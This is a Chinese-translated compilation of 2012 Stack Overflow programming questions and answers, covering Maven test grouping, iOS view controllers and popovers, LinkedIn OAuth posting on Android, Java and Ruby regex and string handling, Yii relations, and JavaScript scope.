> 赞同：1
> 
> 时间：2012-04-20T13:01:33.573
> 
> 标签：java, maven, junit

> **可能重复：**
> [如何在 Maven 中按类别运行 junit 测试](https://stackoverflow.com/questions/3100924/how-to-run-junit-tests-by-category-in-maven)

我有一个关于在 JUnit 中分组测试的问题。

我有一个带有注释的测试类

```
@Category(IntegrationTests.class)
public class TestClass { ... } 
```

而IntegrationTests 只是一个接口。

无论如何我可以在仅运行此类测试的maven命令行中指定吗？

非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T13:45:12.553

单元测试和集成测试之间的区别很简单，[命名约定](http://maven.apache.org/plugins/maven-surefire-plugin/test-mojo.html#includes)：

```
**/Test*.java
**/*Test.java
**/*TestCase.java 
```

将被识别为单元测试。并且基于[maven-failsafe-plugin](http://maven.apache.org/plugins/maven-failsafe-plugin/integration-test-mojo.html#includes)的集成测试将被不同的命名约定识别：

```
**/IT*.java
**/*IT.java
**/*ITCase.java 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T13:08:32.733

为什么不依赖现有的约定？

`mvn clean test`将通过surefire运行单元测试。 `mvn clean verify`将通过故障安全运行集成测试

您可以使用命名约定或注释来强制选择。

```
thisIsAUnitTest.java will be executed by surefire (mvn test)
thisClassIsAnIT.java will be executed by failsafe (mvn verify) 
```

如何 ？！

*   [http://maven.apache.org/plugins/maven-surefire-plugin/](http://maven.apache.org/plugins/maven-surefire-plugin/)
*   [http://maven.apache.org/plugins/maven-failsafe-plugin/](http://maven.apache.org/plugins/maven-failsafe-plugin/)

## 用于单元测试的 SureFire

**默认情况下，Surefire 插件会自动包含所有具有以下通配符模式的测试类：**

```
"**/Test*.java" - includes all of its subdirectories and all java filenames that start with "Test".
"**/*Test.java" - includes all of its subdirectories and all java filenames that end with "Test".
"**/*TestCase.java" - includes all of its subdirectories and all java filenames that end with "TestCase". 
```

## 集成测试的故障保护

**默认情况下，Failsafe Plugin 将自动包含所有具有以下通配符模式的测试类：**

```
"**/IT*.java" - includes all of its subdirectories and all java filenames that start with "IT".
"**/*IT.java" - includes all of its subdirectories and all java filenames that end with "IT".
"**/*ITCase.java" - includes all of its subdirectories and all java filenames that end with "ITCase". 
```

# iphone - 如何从 appDelegate 推送 UIViewController

> ID：10246769
> 
> 赞同：0
> 
> 时间：2012-04-20T13:01:37.770
> 
> 标签：iphone, ios, uiviewcontroller

我有一个`UIViewController`（比如说A）。单击`UIViewController`(A) 中的按钮后，我加载了一个`UIWebView`. 单击 中的组件时`UIWebView`，我需要再次按下`UIViewController`(A)。但我正在处理 appdelegate 类中的 webview 中的点击事件。我将如何`UIViewController`从 appdelegate 类推送。

中组件的点击由`UIWebView`处理

```
- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation {
} 
```

在应用程序委托中

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:19:47.037

只要您有对主窗口的引用并在屏幕上有一个 NavigationController，这应该没问题：（需要 iOS 4）

```
UINavigationController *navigationController = (UINavigationController *)self.window.rootViewController;
[navigationController pushViewController:newViewController animated:YES]; 
```

# java - 使用 Scribe 向 LinkedIn 发布消息，因为它不能在 Android 中工作

> ID：10246770
> 
> 赞同：0
> 
> 时间：2012-04-20T13:01:37.980
> 
> 标签：java, android, oauth, linkedin, scribe

下面是发送帖子消息的代码。在我的屏幕上，我有一个 EditText 部分，允许用户输入文本，当他们点击 post 时，调用 sendMessage 函数。我一直在回复中得到这个。我也尝试过 URLEncode.encode(payload, "UTF-8") 来获取一个编码字符串以添加到正文中，但这不起作用。任何见解都会有所帮助。

```
04-19 18:24:50.570: D/response(693): <error>
04-19 18:24:50.570: D/response(693):   <status>400</status>
04-19 18:24:50.570: D/response(693):   <timestamp>1334859891007</timestamp>
04-19 18:24:50.570: D/response(693):   <request-id>WJPI8VXQME</request-id>
04-19 18:24:50.570: D/response(693):   <error-code>0</error-code>
04-19 18:24:50.570: D/response(693):   <message>Couldn't parse share document: error: Unexpected end of file after null</message>
04-19 18:24:50.570: D/response(693): </error> 
```

这是代码：

```
private static final String SendMessage = "https://api.linkedin.com/v1/people/~/shares";

public void sendMessage(View view)
{
    //Get works just fine
    //OAuthRequest req = new OAuthRequest(Verb.GET, "http://api.linkedin.com/v1/people/~/connections:(id,last-name)");
    //service.signRequest(accessToken, req);
    //Response res = req.send();
    //Log.e("get", res.getBody());

    OAuthRequest post = new OAuthRequest(Verb.POST, SendMessage);

    //Have also  tried adding <?xml version=\"1.0\" encoding=\"UTF-8\"?>" to the beginning of the payload string        
    String payload = "<share>" +
                        "<comment>testing</comment>" +
                        "<visibility><code>anyone</code></visibility>" +
                     "</share>";

    post.addBodyParameter("body", payload);
    post.addHeader("Content-Type", "text/xml;charset=UTF-8");

    service.signRequest(accessToken, post);
    try
    {
        Response response = post.send();
        Log.d("response",response.getBody());
    }
    catch (Exception e)
    {
        e.printStackTrace();
    }
    LinkedInActivity.this.finish();
} 
```

我的服务被定义为：

```
service = new ServiceBuilder()
                .provider(LinkedInApi.class)
                .apiKey(API_KEY)
                .apiSecret(API_SEC)
                .callback(CALLBACK)
                .debug()
                .build();

final Token requestToken = service.getRequestToken();
final String authURL = service.getAuthorizationUrl(requestToken); 
```

我使用 webview 来捕获回调以保存验证者/令牌。示例如下：

```
webView.setWebViewClient(new WebViewClient()
    {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {

            if(url.startsWith("oauth")){
                webView.setVisibility(View.GONE);

                Uri uri = Uri.parse(url);
                String verifier = uri.getQueryParameter("oauth_verifier");
                Verifier v = new Verifier(verifier);

                //save token
                accessToken = service.getAccessToken(requestToken, v);

                if(uri.getHost().equals("linkedIn")){
                    editText.setText(appState.socialMediaMessage);
                    //place the cursor at the end of the predefined text
                    editText.setSelection(editText.getText().length());

                    textLimit = textLimit - editText.length();
                    textView.setText(String.valueOf(textLimit));

                }

                return true;
            }

            return super.shouldOverrideUrlLoading(view, url);
        }
    });

    //send user to authorization page
    webView.loadUrl(authURL); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-21T11:40:19.163

利用：

```
post.addPayload(payload); 
```

代替：

```
post.addBodyParameter("body", payload); 
```

# wcf - 从设备调用 Web 服务时抛出 ORA-12505，否则不会

> ID：10246771
> 
> 赞同：0
> 
> 时间：2012-04-20T13:01:39.360
> 
> 标签：wcf, oracle

我有一个在客户端服务器上运行的 Web 服务。当我通过服务器上的远程桌面访问它并输入参数时，它可以工作。当我从我的计算机访问它并输入参数时，它就可以工作了。当我从连接到计算机的手持设备上的应用程序访问它时，网络方法会抛出

```
{System.Web.Services.Protocols.SoapException: System.Web.Services.Protocols.SoapException:
Server was unable to process request. ---> System.Data.OracleClient.OracleException:
ORA-12505: TNS:listener does not currently know of SID given in connect descriptor 
```

设备没有连接到数据库，它只是调用 Web 服务并将参数传递给它。我还创建了一个测试方法，只返回参数给设备，不连接DB，传递的参数没问题。

这让我发疯，我不知道这怎么可能。有人有什么想法吗？

编辑：工作互联网死了，问题很明显。问题实际上是从设备调用了我的本地开发版本的服务。我不知道为什么。这是服务构造函数的代码（源自 SoapHttpClientProtocol）：

```
 public Service1() {
        this.Url = "LOCAL (WRONG) URL";
    } 
```

通过执行此代码：

```
 server.Service1 s1 = new server.Service1();
    s1.Url = "CLIENT (CORRECT) URL";
    string test = s1.TestMethod(parameters); 
```

在第一行之后， s1.Url 当然是错误的 url。在第二行之后， s1.Url 是正确的 url。然而第三行，连接错误，开发服务！我只是注意到这一点，因为我的互联网死了，与客户端服务器的连接应该失败，但它仍然工作......试图弄清楚为什么会发生这种情况。

# android - 在 OnCreate 中隐藏软输入

> ID：10246776
> 
> 赞同：8
> 
> 时间：2012-04-20T13:01:58.667
> 
> 标签：android, xamarin.android

我有一个 TableLayout，我在 OnCreate 的代码中动态添加内容。一旦 Activity 创建，它就会专注于我动态创建的 EditText 之一并显示键盘。在用户专门按下 EditText 之一之前，我不希望键盘显示。我试过了：

```
InputMethodManager input = (InputMethodManager) GetSystemService(InputMethodService);
input.HideSoftInputFromWindow(CurrentFocus.WindowToken, 0); 
```

但是键盘仍然显示并且 CurrentFocus 返回 null。因此，当我尝试将焦点专门指向另一个视图然后执行上述操作时：

```
InputMethodManager input = (InputMethodManager) GetSystemService(InputMethodService);
title.FindFocus();
input.HideSoftInputFromWindow(CurrentFocus.WindowToken, 0); 
```

CurrentFocus 仍然为空，键盘仍然显示。title 是一个 TextView，我已经在代码中有一个实例。我可以不把焦点放在 TextView 上还是我还缺少其他东西？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-04-20T13:06:04.640

```
 getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_HIDDEN); 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2016-02-08T22:37:52.640

# 好简单

1.  转到您的`AndroidManifest.xml`文件
2.  在您的活动中添加：`android:windowSoftInputMode="stateHidden"`

例如：

```
<activity
         android:name=".package.example.MyActivity"
            android:windowSoftInputMode="stateHidden"/> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-10-19T06:41:08.843

1.  转到 AndroiManifest.xml 文件
2.  要隐藏键盘的活动添加以下内容

    android:windowSoftInputMode="stateHidden|adjustResize|stateAlwaysHidden"

# java - Java 正则表达式令人困惑

> ID：10246777
> 
> 赞同：0
> 
> 时间：2012-04-20T13:02:00.200
> 
> 标签：java, regex

我想像这样解析字符串

```
 0.1142     0.0000     0.0000     0.0004     0.0000     0.0000    2299/2299        MakeRequest   [23] 
```

我想从这个字符串中得到 ol 双打。我正在使用下一个模式

```
.+ ([0-9\\.]+) [\\p{Space}]+ ([0-9\\.]+) [\\p{Space}]+ ([0-9\\.]+) [\\p{Space}]+ ([0-9\\.]+) [\\p{Space}]+ ([0-9\\.]+) [\\p{Space}]+ ([0-9\\.]+) [\\p{Space}]+ ([0-9\\/])+ [\\p{Space}] "\\.(MakeRequest) .+ 
```

而且这个字符串解析得很好。
但我无法解析下一个字符串！

```
 20.1600     0.0001     0.0000     0.0053     0.0001     0.0000  383248/383248      MakeRequest   [22] 
```

这个字符串非常相似！但首先被解析，其次不是:-(

**轻松 **更新模式****

 **```
.+ ([0-9\\.]+) .+ ([0-9\\.]+) .+([0-9\\.]+) .+ ([0-9\\.]+) .+ ([0-9\\.]+) .+ ([0-9\\.]+) .+ ([0-9\\/])+ .+\\.(MakeRequest) .+ 
```

也不行

我正在使用

```
java.util.regex.Pattern 
```

和

```
java.util.regex.Matcher 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T13:08:52.313

> ([0-9\.]+) .+ ([0-9\/])+

匹配空格、一个或多个字符、空格（共 3 个字符）

第二个字符串只有 2 个空格。

> 0.0000 383248/383248

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T13:09:44.940

像下面这样的代码会有什么问题：

```
 final Matcher m = Pattern.compile("\\d+\\.\\d+").matcher(s); // s is your line
  while (m.find()) System.out.println(Double.parseDouble(m.group())); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T13:10:50.580

这是获得所有双打的模式

```
[0-9]*\.[0-9]* 
```**

# asp.net - ASP.net webform url 路由灵活吗？

> ID：10246778
> 
> 赞同：0
> 
> 时间：2012-04-20T13:02:01.833
> 
> 标签：asp.net

我使用 Url Route .net4，我想在我的 URL 地址中使用灵活路径。我为重新调整大小的图像定义了一个 URL 路由：

```
routes.MapPageRoute("thumbnail", "showthumbnail/{size}/{src}", "~/ShowThumbnail.aspx", true, new RouteValueDictionary { { "size", 100 }, { "src", "" } }); 
```

图像可能在 1 或 2 或 3 个子文件夹中：

[http://localhost/200/folder1/folder2/folder3/image1.jpg](http://localhost/200/folder1/folder2/folder3/image1.jpg)
[http://localhost/200/folder1/image1.jpg](http://localhost/200/folder1/image1.jpg)

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-19T10:15:05.873

您需要使用 ResolveClientURL() 访问页面中的确切图像路径，该路径如下所示：

```
<img  src='<%= ResolveClientUrl("~/images/abc.jpg") %>' /> 
```

赋予“src”值的正常方式并非在所有情况下都有效。javascript 也是如此。

请通过以下链接查看我的博客。

[http://karmic-development.blogspot.in/2013/10/url-routing-in-aspnet-web-forms-access.html](http://karmic-development.blogspot.in/2013/10/url-routing-in-aspnet-web-forms-access.html)

# yii - yii '通过' 关系搜索

> ID：10246781
> 
> 赞同：2
> 
> 时间：2012-04-20T13:02:06.953
> 
> 标签：yii

我有以下表格。

```
User:
---------
id<br>
firstName

Project:
---------
id<br>
Name

StaffingManager
---------------
id<br>
User_id(FK)<br>
Total_Staff<br>

StaffingProjectMonth
-----------------------
id<br>
Project_id(FK)<br>
StaffingManager_id(FK)<br> 
```

我想在 StaffingProjectMonth 模型中定义关系

*这是 YII 使用 gii 定义的默认关系*

```
public function relations()
    {
        return array(
            'project' => array(self::BELONGS_TO, 'Project', 'Project_id'),
            'staffingManager' => array(self::BELONGS_TO, 'StaffingManager', 'StaffingManager_id'),
        );
    } 
```

我能够获取 ProjectName 并按 ProjectName 进行搜索。

我想获取 UserfirstName 并以此进行搜索。

我以这种方式定义了关系。

```
return array(
            'project' => array(self::BELONGS_TO, 'Project', 'Project_id'),

            'staffingmanager' => array(self::BELONGS_TO, 'StaffingManager', 'StaffingManager_id'),

            'user'=> array(self::HAS_MANY,'User',array('User_id'=>'id'),'through'=>'staffingmanager' ),
        ); 
```

在搜索方法中我这样做了：

```
$criteria->with = array('project','user');
//$criteria->compare('id',$this->id);
$criteria->compare('Name',$this->Project_id,true);
$criteria->compare('firstName',$this->StaffingManager_id,true); 
```

在视图中：

```
$this->widget('zii.widgets.grid.CGridView', array(
    'id'=>'staffing-project-month-grid',
    'dataProvider'=>$model->search(),
    'filter'=>$model,
    'columns'=>array(       
    //  'id',       
        array('name'=>'Project_id','header'=>'Project','value'=>'$data->project->Name',),
        array('name'=>'StaffingManager_id','header'=>'User','value'=>'$data->staffingmanager->user->firstName',),
        .............. 
```

只有按项目名称搜索才有效。能够 sess UserfirstName 但无法按 firstName 搜索。定义关系有些错误。

任何帮助表示赞赏。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T22:02:19.597

[我推荐redguy](http://www.yiiframework.com/wiki/281/searching-and-sorting-by-related-model-in-cgridview/)的以下优秀 wiki 文章，它描述了如何按相关模型属性进行搜索：

按照本文的方法：

您应该在模型中声明两个新变量：

```
public $project_name;
public $staffingmanager_firstname; 
```

您应该在方法中将这些新变量声明为可安全搜索`rules()`：

```
array( 'project_name,staffingmanager_firstname,...', 'safe', 'on'=>'search' ), 
```

您的`search()`方法标准应如下所示：

```
$criteria->compare('project.Name',$this->project_name,true);
$criteria->compare('user.firstName',$this->staffingmanager_firstname,true); 
```

在您的视图文件中，“列”应为：

```
array('name'=>'project_name','header'=>'Project','value'=>'$data->project->Name',),     
array('name'=>'staffingmanager_firstname','header'=>'User','value'=>'$data->user->firstName',), 
```

希望这可以帮助。

此致...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-23T15:56:47.103

我遇到了 $criteria->with 和“通过”关系的麻烦。事情是有关系的。BELONGS_TO 无法正常工作。我将它切换到 HAS_ONE 并反转 id 方向 - array('parent_id'=>'id')。现在它正在工作！

# ios - EXC_BAD_ACCESS 仅在测试期间使用 ARC

> ID：10246783
> 
> 赞同：7
> 
> 时间：2012-04-20T13:02:13.553
> 
> 标签：ios, automatic-ref-counting, exc-bad-access, ocunit

我遇到了一个问题，即我遇到了错误的访问异常，但仅在运行测试版本时（在调试版本中调用相同的方法不会导致问题出现）。该项目启用了 ARC，我正在使用 Xcode 4.3 在 iPad 5.1 模拟器上运行它：

这就是问题出现的地方：

```
- (void)testChangeFoodNotification {
    Player* p = [[Player alloc] init];
    [p addObserver:self forKeyPath:@"food" options:0 context:0]; // <-EXC_BAD_ACCESS (code=2)
    p.food += 1;
    STAssertTrue(_wasNotifiedOfFoodChange, nil);
} 
```

在`addObserver:`调用该方法时，似乎不应该释放任何涉及的对象，那么可能导致异常的原因是什么？

编辑：

抱歉，如果不清楚，但上面的代码正在作为测试用例的一部分执行（使用标准 Xcode OCUnit）。此外，如果它澄清了任何来自播放器类的相关代码（还有其他 ivars 和方法，但它们与正在测试的属性或方法没有任何联系）：

```
// Public interface
@interface Player : NSObject

@property (nonatomic, assign) NSInteger food;

@end

// Private interface
@interface Player() {
    NSInteger _food;
}

@end

@implementation Player

@synthesize food = _food;

#pragma mark - Getters/Setters

- (void)setFood:(NSInteger)food {
    [self willChangeValueForKey:@"food"];
    _food = food;
    [self didChangeValueForKey:@"food"];    
} 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-04-26T16:47:28.240

如果您的类确实符合键值对，请确保出现问题的类的实现不包含在您的测试产品中。这意味着您的 .m 文件的身份检查器的 Target Membership 面板应该只检查您的应用程序（而不是 YourAppTests）。

我在 Xcode 4.3.1 中遇到了同样的问题，当时两种产品都包含一个实现，并且我在生产和测试代码中都注册了观察者。以下日志提示我：

> YourClass 类在 /Users/yourUser/Library/Application Support/iPhone Simulator/5.1/Applications//YourApp.app/YourApp 和 /Users/yourUser/Library/Developer/Xcode/DerivedData/YourApp-/Build/Products/ 中实现调试-iphonesimulator/YourAppTests.octest/YourAppTests。将使用两者之一。哪一个是未定义的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:31:12.013

根据[Key-Value Observing Programming Guide](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/KeyValueObserving/Articles/KVOCompliance.html#//apple_ref/doc/uid/20002178-BAJEAIEE)，您的 Player 是否符合键值对？您要确保[确保 KVC 合规性](https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/KeyValueCoding/Articles/Compliant.html#//apple_ref/doc/uid/20002172)。我还假设您也实施了您的`observeValueForKeyPath:ofObject:change:context:`? 如果您认为您已经完成了所有这些但仍然无法正常工作，那么也许您可以分享您的代码。

另外，小事，但我认为这是一个突出问题的代码片段。我之所以提到它，是因为 ARC 将在您的 testChangeFoodNotification 结束时释放您的 p 对象，我原以为您想先删除您的观察者。

# ruby - 带有字母的 Ruby 范围规则

> ID：10246785
> 
> 赞同：1
> 
> 时间：2012-04-20T13:02:29.720
> 
> 标签：ruby

当指定一个范围说（'A'..'Z'）时，你会得到预期的结果

```
A
B
C
...
Z 
```

当您将第二个字符指定为 lower 时，您将获得所有小写和大写字母的范围。缩写...

```
[9] pry(main)> ('A'..'z').each {|letter| puts letter}
A
B
C
...
Z
[
\
]
^
_
`
a
b
...
z 
```

当我使用上述相同的前提指定带有字符串的范围时，我不会得到相同的结果。两个范围内不应该出现小写字符串吗？

```
[11] pry(main)> ('a'..'bat').include?('ace')
=> true
[12] pry(main)> ('A'..'bat').include?('ace')
=> false 
```

相反，我只是得到大写字母。

```
[15] pry(main)> ('A'..'at').each {|letter| puts letter}
A
B
C
...
ZV
ZW
ZX
ZY
ZZ
=> "A".."at" 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:13:32.093

这是两种不同类型的范围。

如您所见，如果您要求一系列单个字符，那么您将得到由字符编码（例如 ASCII）定义的所有字符。但是，如果您要求的范围包括长度超过一个字符的字符串，则它不再使用字符集顺序。

相反，Ruby 将每个字符位置视为一个“数字”，其中可能的数字集基于字符的类型。字母表中的字母按大小写分组，因此大写“数字”在整个范围内始终为大写；以所有大写字母开头的范围永远不会包含小写字母。您从“A”开始的范围永远不会到达“at”，而是继续无穷大，Ruby 在“ZZ”之后停止，因为在那之后它必须到达三个字符，而您指定的上限只有两个字符长。

# javascript - “===”在 Javascript/Jquery 中意味着什么？

> ID：10246790
> 
> 赞同：-1
> 
> 时间：2012-04-20T13:02:52.157
> 
> 标签：javascript, jquery, jquery-mobile, operators

> **可能重复：**
> [JavaScript === vs ==：我使用哪个“相等”运算符有关系吗？](https://stackoverflow.com/questions/359494/javascript-vs-does-it-matter-which-equal-operator-i-use)
> [3个不同的等于](https://stackoverflow.com/questions/2063480/the-3-different-equals)

我试图了解这里发生了什么：

```
 data.toPage = $('div#someID');

if ( typeof data.toPage === "string" ) {
      // sth
      console.log("hello");
      } 
```

所以我正在检查一个*字符串*，不是吗？我很好奇，因为我的控制台“你好”。

感谢您的意见！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T13:04:38.813

`==` 这是相等运算符，如果两个操作数相等，则返回布尔值 true。JavaScript 将尝试将不同的数据类型转换为相同的类型以进行比较。假设“a”为 2，“b”为 4，以下示例将返回 true 值：

```
a == 2
a == "2"
2 == '2' 
```

`===` 这是严格的相等运算符，仅当两个操作数相等且类型相同时才返回布尔值 true。这些下一个示例返回 true：

```
a === 2
b === 4 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T13:04:46.947

`===`三等号比较值**和**类型，而双等号`==`只比较值

例如`"1"`，`1`具有相同的值（可以这么说）但类型不同。因此会出现以下情况：

```
"1" == 1 //true
"1" === 1 //false 
```

[这是一些有用的 javascript 知识的好读物](http://www.codeproject.com/Articles/182416/A-Collection-of-JavaScript-Gotchas)，其中包括三等号以及其他一些知识

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-20T13:04:44.013

`===`比较运算符意味着两个值在进行比较之前不会修改其类型，因此它们需要具有相同的类型并表示相同的值才能返回 true 。

```
'1' == 1 // true
'1' === 1 // false 
```

# ruby - Ruby：UTF-8 输入错误

> ID：10246791
> 
> 赞同：0
> 
> 时间：2012-04-20T13:02:55.563
> 
> 标签：ruby, string, encoding, utf-8

我有一个 .rb 文件，它在运行时接受 UTF-8 的字符串输入，但由于某种原因，输入会自动修改。这是我的代码的示例：

```
# encoding :UTF-8
.
.
.
print "Enter a UTF-8 input: "
text = gets.chomp
p text 
```

所以，如果我输入“\n\u001C\u0018\t\u001C”，它会打印出“\\n\\u001C\\u0018\\t\\u001C”，这不是我输入的！虽然我很好奇，但我比较了长度，它是相同的 22。但是，我知道它已被修改，因为当我通过同一文件中的函数运行文本时，它会将其读取为第二个。我知道这一点是因为当我通过 irb 运行我的实际代码时，它按预期工作，但是当我从文件中运行它时，它并没有做我想要的。

**编辑**：肖恩回答了我关于打印的问题，但它没有解释为什么当我将文本中的值用于同一个 ruby​​ 文件中的函数时，它没有看到它应有的内容。换句话说，当我物理输入 UTF 字符串时，该函数在 irb 上完美运行。所以，如果我在下面的函数中输入“\t\u001C\u001C”.xor “key”，结果应该是“bye”。**再一次，这在 irb 中有效，但是当我从文件中运行它时它不起作用！**当我从文件运行它时，当我从 irb 运行它时没有收到任何错误时，它给了我一个“'*'：否定参数 (ArgumentError)”！下面是函数：

```
class String
  def xor(key)
    text = dup
    b1 = text.unpack("U*")
    b2 = key.unpack("U*")
    longest = key.length #[b1.length,b2.length].max
    b1 = [0]*(longest-b1.length) + b1
    b2 = [0]*(longest-b2.length) + b2
    result = b1.zip(b2).map{ |a,b| a^b }
    result.pack("U*")
  end
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T15:26:26.363

发生这种情况的原因是因为您正在使用：

```
p text 
```

对比

```
puts text 
```

当您使用 p 时，ruby 输出以下结果：

```
puts text.inspect 
```

这将向您显示其中被用作转义字符的额外 \。如果您只是使用 puts，您将看到预期的结果！

干杯!

# iphone - 在 uipopover 中时，UIButton 不响应 touchupinside

> ID：10246796
> 
> 赞同：0
> 
> 时间：2012-04-20T13:03:11.163
> 
> 标签：iphone, ios, ipad, uiviewcontroller, uipopovercontroller

我向我的 UIPopoverController 添加了一个按钮，但它似乎没有响应触摸。我不知道我是否应该在 UIPopoverController 上设置一些属性或什么。这是呈现弹出视图和按钮的代码。

```
- (void)topicImageButtonPressed
{
    CGRect aFrame = CGRectMake(0.0, 0.0, 1000.0, 600.0);
    UIViewController *aView = [[UIViewController alloc] init];
    aView.view.frame = aFrame;
    UIImageView *iView = [[UIImageView alloc] init];
    [iView setContentMode:UIViewContentModeScaleAspectFit];
    [iView setImage:self.topicImageView1.image];
    aView.view = iView;

    UIButton *nextButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    [nextButton addTarget:self 
                   action:@selector(quizButtonPressed:)
     forControlEvents:UIControlEventTouchUpInside];
    [nextButton setTitle:@"Next" forState:UIControlStateNormal];

    nextButton.frame = CGRectMake(700.0, 550.0, 160.0, 40.0);

    [aView.view addSubview:nextButton];

    //aView.view.backgroundColor = [UIColor colorWithPatternImage:self.topicImageView1.image];

    imagePopoverController = [[UIPopoverController alloc] 
                         initWithContentViewController:aView];
    imagePopoverController.popoverContentSize = CGSizeMake(1000, 600);

    imagePopoverController.passthroughViews = [NSArray arrayWithObject:nextButton];

    [imagePopoverController presentPopoverFromRect:CGRectMake(212, 10, 1000, 600) inView:self.view 
                     permittedArrowDirections:0 animated:YES];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-21T02:51:00.810

添加它使其工作。iView.userInteractionEnabled = YES；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:11:21.847

```
UIViewController *popoverContent = [[UIViewController alloc]init];
    UIView *popoverView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 768, 1024)];

    datepiker= [[UIDatePicker alloc]init];
    [datepiker setFrame:CGRectMake(0, 0, 320, 216)];
    datepiker.datePickerMode=UIDatePickerModeDateAndTime;
    datepiker.hidden=NO;
    datepiker.minimumDate=[NSDate date];

    [self.view addSubview:datepiker];

    [datepiker release];
    // [datepiker addTarget:self action:@selector(changedDate:) forControlEvents:UIControlEventValueChanged];

    btn_add=[[UIButton alloc]initWithFrame:CGRectMake(115, 250, 100, 30)];
    [btn_add setTitle:@"Add" forState:UIControlStateNormal];
    [btn_add setFont:[UIFont fontWithName:@"Arial-BoldMT" size:20]];
    [btn_add setBackgroundColor:[UIColor redColor]];
    [btn_add addTarget:self action:@selector(AddDate:) forControlEvents:UIControlEventTouchUpInside];
    [popoverView addSubview:btn_add];

    btn_cancel=[[UIButton alloc]initWithFrame:CGRectMake(115, 300, 100, 30)];
    [btn_cancel setTitle:@"Cancel" forState:UIControlStateNormal];
    [btn_cancel setFont:[UIFont fontWithName:@"Arial-BoldMT" size:20]];
    [btn_cancel setBackgroundColor:[UIColor redColor]];
    [btn_cancel addTarget:self action:@selector(CancelDate:) forControlEvents:UIControlEventTouchUpInside];
    [popoverView addSubview:btn_cancel];

    [popoverView addSubview:datepiker];
    [popoverView addSubview:btn_add];
    popoverContent.view = popoverView;
    popoverContent.contentSizeForViewInPopover = CGSizeMake(320,350);

    self.popoverController = [[UIPopoverController alloc]
                                  initWithContentViewController:popoverContent];
    [self.popoverController  presentPopoverFromRect:CGRectMake(230,250, 320,220) 
                                                 inView:self.view permittedArrowDirections:UIPopoverArrowDirectionUp animated:YES];

    [popoverView release];
    [popoverContent release];

-(void)AddDate:(id)sender
{
}
-(void)CancelDate:(id)sender
{
[popoverController dismissPopoverAnimated:YES];

} 
```

试试这个..它成功地为我工作。

# javascript - onLoad 与 onReady 上下文中的 Javascript 范围

> ID：10246805
> 
> 赞同：0
> 
> 时间：2012-04-20T13:03:39.723
> 
> 标签：javascript, jquery, openlayers

我是 javascript 新手，想了解我的代码发生了什么。我正在使用 jQuery 和[OpenLayers](http://openlayers.org/)来做一些网络映射。

这是代码示例 1，其中我的 map 变量是在 onReady 函数中创建的：

```
$(document).ready(function(){
    var map = new.OpenLayers.Map('map', options);
    $.get(my_python.cgi_script which returns an html table of available layers)
    }); 
```

[据我了解](https://stackoverflow.com/questions/500431/javascript-variable-scope)，我的“地图”变量具有本地范围。

在该函数中，我添加了一些图层、生成控件等。所有这些都在 OpenLayers 文档中工作和介绍。我还使用 jQuery 的 get 方法来调用一个 python.cgi 脚本，该脚本动态生成一个可用层表。这一切都发生在上面的 onReady 中。

我需要处理动态生成的内容，发现我需要将代码放入 onLoad 函数中。如果我将第二个代码块放入 onReady 函数中，则无法通过 jQuery 访问缩略图，因为呈现事物的顺序。

```
$(document).ready(function(){
    var map = new.OpenLayers.Map('map', options);
    //More code to dynamically generate a list of available layers, stored in a table
    $.get(my_python.cgi_script which returns an html table of available layers)
    });

$(body).onLoad(function(){
 $(img.thumbnail).bind('click', function(){
  var name = $(this).attr('layer_name_id')
  var layer = new OpenLayers.WMS(//all the stuff to add the layer, including name)
  map.addLayer('layer') //map undefined due to scope
});
}); 
```

在上面的块中，'map' 在第二个变量中是未定义的。我理解为什么（范围）并决定 map 需要是一个全局变量。然后我尝试了：

```
var map; //This is a global because it is defined outside of any functions?
$(document).ready(function(){
    map = new.OpenLayers.Map('map', options);
    //More code to dynamically generate a list of available layers, stored in a table
    $.get(my_python.cgi_script which returns an html table of available layers)
    });

$(body).onLoad(function(){
 $(img.thumbnail).bind('click', function(){
  var name = $(this).attr('layer_name_id')
  var layer = new OpenLayers.WMS(//all the stuff to add the layer, including name)
  map.addLayer('layer')
});
}); 
```

地图变量仍未定义。为什么？我是否误解了全球的运作方式？

通过将 onLoad 函数放在 onReady 代码块中，我能够让一切正常工作。我不知道为什么下面的工作：

```
$(document).onReady(function(){
    var map = new.OpenLayers.Map('map', options);
    //More code to dynamically generate a list of available layers, stored in a table
    $.get(my_python.cgi_script which returns an html table of available layers)

$(body).onLoad(function(){
 $(img.thumbnail).bind('click', function(){
  var name = $(this).attr('layer_name_id')
  var layer = new OpenLayers.WMS(//all the stuff to add the layer, including name)
  map.addLayer('layer')
  });
}); 
```

});

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:16:33.170

